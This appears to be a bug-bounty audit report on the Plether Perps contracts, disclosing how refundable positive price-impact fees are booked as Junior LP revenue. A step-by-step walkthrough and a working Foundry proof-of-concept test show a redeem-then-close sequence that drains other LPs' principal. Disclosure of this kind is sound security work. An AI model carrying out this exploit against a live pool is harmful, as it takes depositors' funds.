# \#98785 [SC-Critical] Premature recognition of refundable positive VPI as Junior LP revenue and omission from withdrawal reserves leads to direct theft of remaining Junior LPs' principal*

**Submitted on Nov 10th 2026 at 06:48:37 UTC by @n0fr33w1f14u for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98785
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description



## Brief/Intro

In Plether Perps, Virtual Price Impact (VPI) prices directional skew using a state potential `Cost(S) = (k * S^2) / (2 * D)`. A trader who increases skew from `0` to `S` pays a positive VPI charge into `HousePool`, and if that trader subsequently closes the position to return skew from `S` to `0`, `HousePool` refunds that VPI to the trader as a closing action rebate (up to the position's positive `vpiAccrued`). Despite this VPI being refundable while the skew remains open, `CfdEngineSettlementSidecar.executeOpen()` immediately books the inflow as `ClaimantInflowKind.Revenue`, `HousePool._reconcile()` distributes 100% of it into `juniorPrincipal`, and `HousePoolAccountingLib.buildWithdrawalSnapshot()` fails to reserve it from withdrawable cash (`freeAssets`). If exploited in production, an attacker who is both a Junior LP and a trader can repeatedly inflate Junior NAV with their own refundable VPI, redeem their Junior shares to extract a pro-rata share of that VPI in USDG, and then close their trade seconds later so the remaining Junior LPs are forced to pay the full VPI refund out of their own deposited principal.

## Vulnerability Details

### 1. Positive VPI on Open is immediately booked as realized LP revenue

When an open order increases directional skew, `OpenAccountingLib.tryBuildOpenState()` computes a positive `state.vpiAssets` charge and adds it to `state.tradeCostAssets`:

```solidity
// packages/perps/src/libraries/OpenAccountingLib.sol
(valid, state.vpiAssets) = CfdMath.tryCalculateVPI(
    inputs.preSkewAssets,
    inputs.postSkewAssets,
    inputs.poolDepthAssets,
    inputs.riskParams.vpiFactor
);
if (!valid) {
    return (false, state, 0);
}
state.notionalAssets = addedEntryCostAssetAtoms;
state.executionFeeAssets = (state.notionalAssets * inputs.executionFeeBps) / 10_000;
state.tradeCostAssets = state.vpiAssets + int256(state.executionFeeAssets);
```

During settlement, `CfdEngineSettlementSidecar.executeOpen()` routes the execution fee to `protocolTreasury` and transfers the remaining positive trade cost (the positive VPI charge) into `HousePool` as `ClaimantInflowKind.Revenue` with `CashArrived`:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol
(int256 netMarginChange, uint256 protocolFeeCreditedAssets) = clearinghouse.applyOpenCost(
    delta.account,
    delta.marginDeltaAssets,
    delta.tradeCostAssets,
    host.pool(),
    host.protocolTreasury(),
    delta.executionFeeAssets
);
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

In `HousePool.recordClaimantInflow()`, `accountedAssets` is immediately incremented by `poolCashInflowAssets`. Meanwhile, `CfdEngine.settlementWritePosition()` stores the positive VPI on the position in `pos.vpiAccrued`.

### 2. `HousePool` reconciliation and withdrawal reserves ignore refundable positive VPI

When `HousePool._reconcile()` runs during `settleLpEpoch()`, it builds its reconciliation snapshot via `CfdEngineProtocolLens.getHousePoolInputSnapshot()` and `HousePoolAccountingLib.buildReconcileSnapshot()`:

```solidity
// packages/perps/src/libraries/HousePoolAccountingLib.sol
function buildReconcileSnapshot(
    HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot
) internal pure returns (ReconcileSnapshot memory snapshot) {
    uint256 terminalAssets = engineSnapshot.physicalAssets;
    uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
    int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
    if (terminalDelta >= 0) {
        terminalAssets += uint256(terminalDelta);
    } else {
        terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
    }

    if (terminalAssets >= terminalLiabilities) {
        snapshot.distributable = terminalAssets - terminalLiabilities;
    } else {
        snapshot.deficit = terminalLiabilities - terminalAssets;
    }
}
```

Here:
* `engineSnapshot.physicalAssets` (`HousePool.totalAssets()`) includes the newly arrived positive VPI cash.
* `engineSnapshot.terminalLpPriceDeltaAssets` comes from `TerminalNavBookV2`, which only tracks price PnL (`lots * markPrice - entryCost`) and does not track `vpiAccrued` or the refundable skew potential `Cost(S)`.
* Consequently, `snapshot.distributable` increases by the full positive VPI amount, and `HousePoolWaterfallAccountingLib.distributeRevenue()` credits 100% of that amount to `juniorPrincipal` (whenever Senior is unimpaired):

```solidity
// packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol
nextState.juniorPrincipal += remaining;
```

Furthermore, `HousePoolAccountingLib.buildWithdrawalSnapshot()` only reserves `maxLiabilityAssets + traderClaimBalanceAssets + supplementalReservedAssets`:

```solidity
// packages/perps/src/libraries/HousePoolAccountingLib.sol
function buildWithdrawalSnapshot(
    HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot
) internal pure returns (WithdrawalSnapshot memory snapshot) {
    snapshot.physicalAssets = engineSnapshot.physicalAssets;
    snapshot.maxLiability = engineSnapshot.maxLiabilityAssets;
    snapshot.reserved = engineSnapshot.maxLiabilityAssets + engineSnapshot.traderClaimBalanceAssets
        + engineSnapshot.supplementalReservedAssets;
    snapshot.freeAssets =
        snapshot.physicalAssets > snapshot.reserved ? snapshot.physicalAssets - snapshot.reserved : 0;
}
```

Because refundable positive VPI is neither deducted from `distributable` nor reserved in `snapshot.reserved`, redeeming Junior LPs can physically withdraw their share of the positive VPI in USDG during `settleLpEpoch()`.

### 3. Closing the position refunds the VPI out of remaining Junior LPs' principal

When the trader closes the position and returns skew back to `0`, `CloseAccountingLib.buildCloseState()` computes a negative `state.vpiDeltaAssets` (bounded by the lifetime clamp so `proportionalAccrualAssets + vpiDeltaAssets >= 0`, which permits a full refund of the positive `vpiAccrued` paid on open):

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

Note that this full refund of `vpiAccrued` does **not** depend on shrinking `poolDepthAssets` to amplify the VPI curve (unlike `SCAN-31`): even at the original unmanipulated pool depth, reversing skew from `S` back to `0` produces `postCost - preCost = -vpiAccrued`.

In `CfdEnginePlanLib._planCloseActionSettlement()`, `actionNetAssets` is negative (`cs.vpiDeltaAssets + int256(cs.executionFeeAssets)`), which sets `delta.actionRebateAssets = uint256(-actionNetAssets)`. `CfdEngineSettlementSidecar.executeClose()` then pays `delta.actionRebatePaidAssets` directly out of `HousePool`:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

`HousePool.payOut()` decrements `accountedAssets` and transfers USDG to `MarginClearinghouse`. On the next reconciliation, `HousePoolWaterfallAccountingLib.absorbLoss()` deducts that outflow from `juniorPrincipal`. Because the attacker already redeemed their Junior shares before closing the position, the remaining Junior LPs bear 100% of the VPI refund despite having received only their pro-rata fraction when the position was opened.

*(Note: This root cause is also independent of the negative-opening-VPI clawback issue: for negative opening VPI, `MarginClearinghouse` already locks a dedicated `vpiRebateReserve` and the pool never overpays cash on redemption; here, positive opening VPI has no reserve at all, is booked as `Revenue` in `executeOpen()`, and is left unreserved in `buildWithdrawalSnapshot()`.)*

## Impact Details

This vulnerability enables **direct theft of existing Junior LPs' deposited principal** (user funds at-rest).

Under the release parameters (`vpiFactor = 1%`, `maxSkewRatio = 40%`, `executionFeeBps = 4` (0.04%), `settlementBufferBps = 25` (0.25%), `maxSeniorShareBps = 8000` (80%)):
* Opening a maximum-skew trade (`S = 0.40 * D`) charges:
  `VPI_open = (0.01 * (0.40 * D)^2) / (2 * D) = 0.0008 * D` (`8 bps` of pool depth `D`).
* The open execution fee is `0.0004 * (0.40 * D) = 0.00016 * D` (`1.6 bps` of `D`), and the close execution fee is `1.6 bps` of `D`, for a round-trip fee cost of `3.2 bps` of `D`.
* If the attacker owns fraction `alpha` of the Junior tranche and redeems at the epoch boundary while the trade is open, the attacker extracts `alpha * 8 bps` of `D` via Junior share redemption and pays `3.2 bps` of `D` in round-trip execution fees.
* Whenever `alpha > 40%`, the attack is strictly net-profitable for the attacker in a single pass:
  * **Attacker net profit per epoch:** `(alpha * 8 - 3.2) bps` of `D`
  * **Remaining Junior LPs' principal loss per epoch:** `((1 - alpha) * 8 - (8 - 1.6)) bps = -(8 * alpha - 1.6) bps` of `D`

Because both VPI at 40% skew and execution fees scale linearly with pool depth `D`, the exploit works identically at any pool size:
* **On a $100,000,000 pool** ($10M Senior, $90M Junior, attacker holds 60% of Junior = $54M):
  * Attacker extracts **+$48,000** from Junior redemption, pays **-$32,000** in round-trip trade costs, and earns **+$16,000 net profit** in a 2-second trade window.
  * Remaining Junior LPs' principal drops from **$36,000,000** to **$35,968,000** (a direct principal loss of **-$32,000**).
* **On a $10,000,000 pool** ($1M Senior, $9M Junior, attacker holds 60% of Junior = $5.4M, requiring only ~$5.43M total capital):
  * Attacker earns **+$1,600 net profit** and remaining Junior LPs lose **-$3,200 of their principal** in a single epoch pass.

By pre-queuing `requestRedeem` before the 5-minute epoch cutoff and opening the position just 2 seconds before the hour boundary, the position is only held open for **2 seconds**, making carry and Senior coupon accrual negligible (`< $0.10`).

---

# 3. Proof of Concept

## Step-by-Step Walkthrough

### Initial State
Assume the frozen release parameters:
* `vpiFactor = 0.01e18` (1%)
* `maxSkewRatio = 0.40e18` (40%)
* `executionFeeBps = 4` (4 bps)
* `settlementBufferBps = 25` (25 bps)
* `initMarginBps = 20` (20 bps), `maintMarginBps = 10` (10 bps), `bountyBps = 10` (10 bps)
* `maxSeniorShareBps = 8000` (80%)
* Basket mark price = `$1.00` (`100_000_000`) throughout.

Pool state at Epoch 2 (`t = 7200`), after initial deposits have been active for at least 1 hour (`DEPOSIT_COOLDOWN = 3600` seconds has elapsed):
* `HousePool.totalAssets()` = `100_000_000e6` ($100,000,000)
* `HousePool.seniorPrincipal` = `10_000_000e6` ($10,000,000)
* `HousePool.juniorPrincipal` = `90_000_000e6` ($90,000,000)
  * Innocent Junior LPs own 40% of Junior shares (`36_000_000_000e6` shares, worth **$36,000,000**)
  * Attacker owns 60% of Junior shares (`54_000_000_000e6` shares, worth **$54,000,000**)
* Existing open interest = `0` on both LONG and SHORT.

---

### Step 1: Attacker pre-queues their 60% Junior redemption before the 5-minute epoch cutoff
At **`t = 10,490`** (10 seconds before the `t = 10,500` request cutoff for Epoch 3, which matures at `t = 10,800`):
1. Attacker calls `juniorVault.requestRedeem(54_000_000_000e6, attacker, attacker)`.
2. `TrancheVault` escrows the attacker's 60% Junior shares into `redeemEpochs[3]`. No share pricing occurs yet; pricing is deferred until `settleLpEpoch` runs at `t >= 10,800`.

---

### Step 2: Attacker opens a $40,000,000 LONG position just before the Epoch 3 boundary
At **`t = 10,798`** (2 seconds before Epoch 3 matures):
1. Attacker deposits `$300,000` USDG into `MarginClearinghouse` via `clearinghouse.depositMargin(300_000e6)`.
2. Attacker calls `orderRouter.commitOrder(openRequest)` for a LONG position with `sizeDelta = 40_000_000e18` (400,000 lots), `marginDelta = 250_000e6`, and `targetPrice = 100_000_000` ($1.00).

At **`t = 10,799`** (next L2 block, 1 second before Epoch 3 matures):
3. Attacker calls `orderRouter.executeOrder(openOrderId, pythUpdateData)` at price `$1.00`.
4. Inside `planOpen()` and `executeOpen()`:
   * Post-open skew is `$40,000,000`, which equals the 40% maximum skew limit (`40% * $100,000,000 = $40,000,000`).
   * Opening VPI charge:
     `VPI_open = (0.01 * 40,000,000^2) / (2 * 100,000,000) = 80,000e6` (**$80,000**).
   * Opening execution fee (4 bps of $40M):
     `Fee_open = 40,000,000e6 * 4 / 10,000 = 16,000e6` (**$16,000**).
   * Total trade cost debited from Attacker's clearinghouse balance = **$96,000**.
   * `$16,000` is credited to `protocolTreasury`, and `$80,000` USDG is transferred to `HousePool` and booked via `recordClaimantInflow(80_000e6, Revenue, CashArrived)`.
   * `HousePool.accountedAssets` increases from `$100,000,000` to **`$100,080,000`**.
   * Attacker's position records `pos.vpiAccrued = +80,000e6`.

---

### Step 3: Attacker settles Epoch 3 at `t = 10,800` and redeems 60% of Junior for +$48,000 extra
At **`t = 10,800`** (1 second after the open order executed):
1. Attacker calls `orderRouter.settleLpEpoch(pythUpdateData)` with the Pyth basket price at `$1.00`.
2. Inside `HousePool._settleLpEpoch()`:
   * `_reconcile()` computes `reconcileSnapshot.distributable = $100,080,000` (since `terminalLpPriceDeltaAssets == 0` at `$1.00`).
   * The waterfall sees `$80,000` of revenue above `seniorPrincipal + juniorPrincipal` (`$100,000,000`) and adds all `$80,000` to `juniorPrincipal`:
     `juniorPrincipal` becomes **`$90,080,000`**.
   * `buildWithdrawalSnapshot()` computes `reserved = $40,000,000 (maxLiability) + $100,000 (25 bps buffer) = $40,100,000`, leaving `freeAssets = $100,080,000 - $40,100,000 = $59,980,000`.
   * The Senior ratio covenant only requires `$2,500,000` of Junior principal to back `$10,000,000` of Senior at `maxSeniorShareBps = 8000`, so `juniorPhase.budget = $59,980,000`.
   * `_fundRedemptionPhase()` funds 100% of the attacker's `redeemEpochs[3]` request (60% of Junior supply) at `pricingPrincipal = $90,080,000`:
     `fundedAssets = 60% * $90,080,000 = $54,048,000` (ignoring < $0.01 virtual-share rounding).
   * `HousePool` transfers **`$54,048,000`** to `juniorVault`, reduces `juniorPrincipal` to **`$36,032,000`**, and reduces `accountedAssets` to **`$46,032,000`**.
3. Attacker calls `juniorVault.redeem(54_000_000_000e6, attacker, attacker)` to withdraw **`$54,048,000` USDG**—locking in **`+$48,000`** above their `$54,000,000` Junior deposit.

---

### Step 4: Attacker immediately closes the $40,000,000 LONG position and collects the $64,000 net VPI rebate
Still at **`t = 10,800`**:
1. Attacker calls `orderRouter.commitOrder(closeRequest)` to full-close the `40,000_000e18` LONG position (`isClose = true`).

At **`t = 10,801`** (next L2 block, 1 second later):
2. Attacker calls `orderRouter.executeOrder(closeOrderId, pythUpdateData)` at price `$1.00`.
3. Inside `planClose()` and `executeClose()`:
   * `realizedPnlAssets = 0` (price is still `$1.00`).
   * `CloseAccountingLib.buildCloseState()` computes the skew-reducing VPI delta from `$40,000,000` skew to `$0` skew (`-$173,792` raw at `$46.032M` depth, or `-$80,000` even at `$100M` depth) and clamps it via `if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) state.vpiDeltaAssets = -state.proportionalAccrualAssets;` to **`-$80,000`** (`-80_000e6`).
   * Close execution fee is `16,000e6` (**$16,000**).
   * `actionNetAssets = -80,000e6 + 16,000e6 = -64,000e6`, resulting in `delta.actionRebatePaidAssets = 64,000e6` (**$64,000**).
   * `HousePool.payOut()` transfers **`$64,000` USDG** to `MarginClearinghouse` for the attacker and reduces `HousePool.accountedAssets` from `$46,032,000` to **`$45,968,000`**.
4. Attacker withdraws their entire clearinghouse balance.

---

### Step 5: Final Accounting Verification
When `HousePool._reconcile()` next updates (or is previewed via `juniorVault.totalAssets()`):
* `HousePool.totalAssets()` is **`$45,968,000`**.
* `seniorPrincipal` is **`$10,000,000`**.
* `juniorPrincipal` (now 100% owned by the innocent Junior LPs) is reconciled down from `$36,032,000` to **`$35,968,000`**.

**Final PnL Summary:**
* **Attacker LP gain:** `+$48,000` (`$54,048,000` redeemed vs. `$54,000,000` deposited)
* **Attacker trader round-trip cost:** `-$32,000` (`-$96,000` paid on open + `+$64,000` rebate received on close)
* **Attacker net profit:** **`+$16,000`**
* **Protocol Treasury fee:** **`+$16,000`**
* **Innocent Junior LPs' principal loss:** **`-$32,000`** (`$35,968,000` ending principal vs. `$36,000,000` starting principal)

## Proof of Concept

## Proof of Concept
`test/poc/RefundablePositiveVpiJuniorTheftVerify.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC: refundable positive VPI is recognized as Junior revenue at epoch settlement, letting an attacker
///         who is both a Junior LP and a trader redeem at an inflated NAV and then reclaim the VPI on close,
///         paid out of the remaining Junior LPs' principal.
/// @dev Release parameters (DEPLOYMENT.md): vpiFactor 1%, maxSkewRatio 40%, init/maint 20/10 bps,
///      executionFeeBps 4, settlementBufferBps 25, Senior cap 40M / 80%. Price is flat at $1.00 throughout,
///      so no market PnL is involved. The attack-phase epoch is settled through the permissionless
///      `router.settleLpEpoch(pythUpdateData)` entrypoint. Setup-phase settlement uses the suite's helper.
contract RefundablePositiveVpiJuniorTheftVerify is BasePerpTest {

    address private constant SENIOR_LP = address(0x5E1102);
    address private constant INCUMBENT = address(0xA11CE);
    address private constant ATTACKER = address(0xB0B);

    uint256 private constant PRICE = 1e8;
    uint256 private constant SENIOR_DEPOSIT = 10_000_000e6;
    uint256 private constant INCUMBENT_DEPOSIT = 36_000_000e6; // 40% of Junior
    uint256 private constant ATTACKER_DEPOSIT = 54_000_000e6; // 60% of Junior
    uint256 private constant TRADE_SIZE = 40_000_000e18; // $40M notional = 40% skew cap
    uint256 private constant MARGIN_DEPOSIT = 300_000e6;
    uint256 private constant MARGIN_COMMITTED = 250_000e6;

    uint256 private attackerShares;
    uint256 private incumbentShares;
    uint256 private seniorShares;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        vm.warp(SETUP_TIMESTAMP);

        _seedPool();
    }

    /// @notice Full attack: queue redemption, open max-skew trade before the boundary, settle, redeem, close.
    function test_Poc_RedeemAtVpiInflatedNavThenReclaimVpi() public {
        uint256 treasuryBefore = _treasuryWealth();
        uint256 incumbentBefore = juniorVault.convertToAssets(incumbentShares);
        uint256 seniorBefore = seniorVault.convertToAssets(seniorShares);
        uint256 attackerLpBefore = juniorVault.convertToAssets(attackerShares);

        // 1. Queue the full Junior redemption before the request cutoff (no pricing yet).
        (uint256 targetEpoch, uint256 cutoffTime) = juniorVault.getRequestEpochWindow();
        require(block.timestamp < cutoffTime, "queue before cutoff");
        // shares are escrowed now but priced only at settleLpEpoch, so the attacker can still
        // inflate the NAV used for this redemption after queueing it.
        vm.prank(ATTACKER);
        juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);

        // 2. Open a $40M LONG two seconds before the epoch boundary; pays $80k positive VPI into HousePool.
        uint256 epochStart = pool.lpEpochStart(targetEpoch);
        vm.warp(epochStart - 2);
        _fundTrader(ATTACKER, MARGIN_DEPOSIT);
        uint256 attackerTraderBefore = _wealth(ATTACKER);
        // skew 0 -> 40% of depth. VPI = k*S^2/(2D) = 0.01*(40M)^2/(2*100M) ~= $80k goes to HousePool as
        // ClaimantInflowKind.Revenue (CfdEngineSettlementSidecar.executeOpen), while the same amount is stored as
        // refundable pos.vpiAccrued. No reserve is created for it (only negative VPI is reserved).
        _openAttackPosition();

        // 3. Anyone settles the epoch through the router; the attacker's shares are priced with the VPI in NAV.
        vm.warp(epochStart);
        // _reconcile sees the $80k as distributable (TerminalNavBookV2 tracks price PnL only) and credits it
        // to juniorPrincipal; buildWithdrawalSnapshot does not reserve it, so it is withdrawable cash.
        // The attacker's 60% redemption is funded at this inflated principal (+~$48k).
        router.settleLpEpoch{value: pletherOracle.getUpdateFee(new bytes[](0))}(_mockPythUpdateData(PRICE));

        uint256 claimable = juniorVault.claimableRedeemRequest(targetEpoch, ATTACKER);
        assertEq(claimable, attackerShares, "redemption fully funded");
        vm.prank(ATTACKER);
        uint256 redeemed = juniorVault.claimRedeem(targetEpoch, claimable, ATTACKER, ATTACKER);

        // 4. Close immediately; the lifetime clamp lets the full $80k VPI come back (net of close fee).
        // KEY: skew 40% -> 0 gives a negative VPI delta; the lifetime clamp (CloseAccountingLib) caps it at
        // -vpiAccrued, i.e. the full $80k. Net of the $16k close fee, HousePool.payOut sends ~$64k to the attacker,
        // and the next reconcile absorbs it from juniorPrincipal, now owned only by the incumbent.
        _closeAttackPosition();
        uint256 attackerBalance = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, attackerBalance);

        // Attacker: +48k (LP) - 96k (open VPI + fee) + 64k (close rebate) ~= +16k. Incumbent: +32k - 64k ~= -32k.
        int256 attackerDelta = int256(_wealth(ATTACKER)) - int256(attackerTraderBefore) - int256(attackerLpBefore);
        int256 incumbentDelta = int256(juniorVault.convertToAssets(incumbentShares)) - int256(incumbentBefore);
        int256 seniorDelta = int256(seniorVault.convertToAssets(seniorShares)) - int256(seniorBefore);
        int256 treasuryDelta = int256(_treasuryWealth()) - int256(treasuryBefore);

        console2.log("attacker redeemed assets ", redeemed);
        console2.log("attacker LP gain         ", redeemed - attackerLpBefore);
        console2.log("attacker net delta       ", attackerDelta);
        console2.log("incumbent Junior delta   ", incumbentDelta);
        console2.log("senior delta             ", seniorDelta);
        console2.log("treasury delta           ", treasuryDelta);

        assertApproxEqAbs(redeemed - attackerLpBefore, 48_000e6, 100e6, "attacker LP gain ~ 60% of VPI");
        assertGt(attackerDelta, 15_000e6, "attacker net profit");
        assertLt(incumbentDelta, -30_000e6, "incumbent Junior principal loss");
        assertApproxEqAbs(attackerDelta + incumbentDelta + seniorDelta + treasuryDelta, 0, 10e6, "value conserved");

        // 5. The incumbent's loss is physical: a full exit pays less than the deposit.
        (uint256 incEpoch,) = juniorVault.getRequestEpochWindow();
        vm.prank(INCUMBENT);
        juniorVault.requestRedeem(incumbentShares, INCUMBENT, INCUMBENT);
        vm.warp(pool.lpEpochStart(incEpoch));
        router.settleLpEpoch{value: pletherOracle.getUpdateFee(new bytes[](0))}(_mockPythUpdateData(PRICE));
        uint256 incClaimable = juniorVault.claimableRedeemRequest(incEpoch, INCUMBENT);
        vm.prank(INCUMBENT);
        uint256 incPayout = juniorVault.claimRedeem(incEpoch, incClaimable, INCUMBENT, INCUMBENT);
        // Exit funding can be partial (Senior covenant keeps some Junior backing), so compare per funded share.
        uint256 depositValueOfFunded = (INCUMBENT_DEPOSIT * incClaimable) / incumbentShares;
        console2.log("incumbent funded shares  ", incClaimable);
        console2.log("incumbent total shares   ", incumbentShares);
        console2.log("incumbent exit payout    ", incPayout);
        console2.log("deposit value of funded  ", depositValueOfFunded);
        console2.log("realized exit loss       ", depositValueOfFunded - incPayout);
        assertLt(incPayout, depositValueOfFunded, "incumbent exits below deposit per share");
    }

    /// @notice Control: identical trades without the redemption. The round trip only costs the attacker fees and
    ///         incumbents are not harmed, so the profit above comes solely from redeeming while VPI is in NAV.
    function test_Control_SameTradesWithoutRedemption() public {
        uint256 incumbentBefore = juniorVault.convertToAssets(incumbentShares);
        uint256 attackerLpBefore = juniorVault.convertToAssets(attackerShares);

        (uint256 targetEpoch,) = juniorVault.getRequestEpochWindow();
        uint256 epochStart = pool.lpEpochStart(targetEpoch);
        vm.warp(epochStart - 2);
        _fundTrader(ATTACKER, MARGIN_DEPOSIT);
        uint256 attackerTraderBefore = _wealth(ATTACKER);
        // Same open/close, but the attacker keeps its shares: it absorbs 60% of the refund it receives, so the
        // VPI round trip nets to zero and only the fees remain as cost.
        _openAttackPosition();

        vm.warp(epochStart);

        _closeAttackPosition();
        uint256 attackerBalance = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, attackerBalance);

        int256 attackerDelta = int256(_wealth(ATTACKER)) + int256(juniorVault.convertToAssets(attackerShares))
            - int256(attackerTraderBefore) - int256(attackerLpBefore);
        int256 incumbentDelta = int256(juniorVault.convertToAssets(incumbentShares)) - int256(incumbentBefore);

        console2.log("control attacker net delta    ", attackerDelta);
        console2.log("control incumbent Junior delta", incumbentDelta);

        assertLt(attackerDelta, 0, "round trip alone is unprofitable");
        assertGe(incumbentDelta, 0, "incumbents unharmed without the redemption");
    }

    // ------------------------------------------------------------------ helpers

    function _seedPool() private {
        settlementToken.mint(INCUMBENT, INCUMBENT_DEPOSIT);
        vm.startPrank(INCUMBENT);
        settlementToken.approve(address(juniorVault), INCUMBENT_DEPOSIT);
        uint256 incReq = juniorVault.requestDeposit(INCUMBENT_DEPOSIT, INCUMBENT, INCUMBENT);
        vm.stopPrank();

        settlementToken.mint(ATTACKER, ATTACKER_DEPOSIT);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), ATTACKER_DEPOSIT);
        uint256 atkReq = juniorVault.requestDeposit(ATTACKER_DEPOSIT, ATTACKER, ATTACKER);
        vm.stopPrank();

        vm.warp(juniorVault.depositEpochStart(atkReq));
        _refreshMark();
        _settleLpEpochForTest();
        vm.prank(INCUMBENT);
        incumbentShares = juniorVault.claimDeposit(incReq, INCUMBENT_DEPOSIT, INCUMBENT, INCUMBENT);
        vm.prank(ATTACKER);
        attackerShares = juniorVault.claimDeposit(atkReq, ATTACKER_DEPOSIT, ATTACKER, ATTACKER);

        uint256 total = attackerShares + incumbentShares;
        assertApproxEqRel((attackerShares * 1e18) / total, 0.6e18, 0.001e18, "attacker owns ~60% of Junior");

        settlementToken.mint(SENIOR_LP, SENIOR_DEPOSIT);
        vm.startPrank(SENIOR_LP);
        settlementToken.approve(address(seniorVault), SENIOR_DEPOSIT);
        uint256 seniorReq = seniorVault.requestDeposit(SENIOR_DEPOSIT, SENIOR_LP, SENIOR_LP);
        vm.stopPrank();
        vm.warp(seniorVault.depositEpochStart(seniorReq));
        _refreshMark();
        _settleLpEpochForTest();
        vm.prank(SENIOR_LP);
        seniorShares = seniorVault.claimDeposit(seniorReq, SENIOR_DEPOSIT, SENIOR_LP, SENIOR_LP);

        uint256 cooldownEnd = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp <= cooldownEnd) {
            vm.warp(cooldownEnd + 1);
        }
    }

    function _openAttackPosition() private {
        vm.prank(ATTACKER);
        uint64 openId = router.commitOrder(CfdTypes.Side.LONG, TRADE_SIZE, MARGIN_COMMITTED, PRICE, false);
        router.executeOrder(openId, _mockPythUpdateData(PRICE));
        (,,,,,, int256 accruedVpi) = engine.positions(ATTACKER);
        console2.log("accrued positive VPI     ", accruedVpi);
        assertApproxEqAbs(accruedVpi, 80_000e6, 10e6, "positive VPI accrued ~ $80k");
    }

    function _closeAttackPosition() private {
        vm.prank(ATTACKER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, TRADE_SIZE, 0, 0, true);
        router.executeOrder(closeId, _mockPythUpdateData(PRICE));
        (uint256 size,,,,,,) = engine.positions(ATTACKER);
        assertEq(size, 0, "position closed");
    }

    function _wealth(
        address account
    ) private view returns (uint256) {
        return settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account);
    }

    function _treasuryWealth() private view returns (uint256) {
        address treasury = engine.protocolTreasury();
        return settlementToken.balanceOf(treasury) + clearinghouse.balanceAssets(treasury);
    }

    function _refreshMark() private {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.prank(address(router));
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
    }

}

```
